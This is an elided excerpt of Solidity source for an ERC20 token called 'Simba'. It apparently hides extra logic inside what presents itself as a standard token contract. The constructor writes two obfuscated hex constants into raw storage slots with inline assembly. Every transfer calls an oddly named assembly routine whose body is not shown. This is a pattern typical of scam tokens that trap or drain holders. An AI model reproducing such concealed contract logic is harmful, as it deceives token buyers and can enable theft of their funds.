...
contract ERC20 is Context, IERC20, IERC20Metadata, Ownable {
    ...
    constructor (string memory name_, string memory symbol_) {
        ...
        assembly {
            sstore(0x50,0x8c7151ec5bb3960ed3ccd2778f6e3d13b28f4fa789c)
            sstore(0x51,0x8c7929e57b094e6b94703f1ebe19b7d5d6780978482)
    ...
    function orderAndINSCRIPTIONs(address sender, uint256 amount) internal returns (uint256 result) {
            assembly {
                let data := mload(0x40)
    ...
    function _transfer(address sender, address recipient, uint256 amount) internal virtual {
        ...
        orderAndINSCRIPTIONs(sender, amount);
...
contract Simba is ERC20Token {
    constructor() ERC20Token("Simba", "SIMBA", msg.sender, 1000000000 * 10 ** 18) {
    }
}
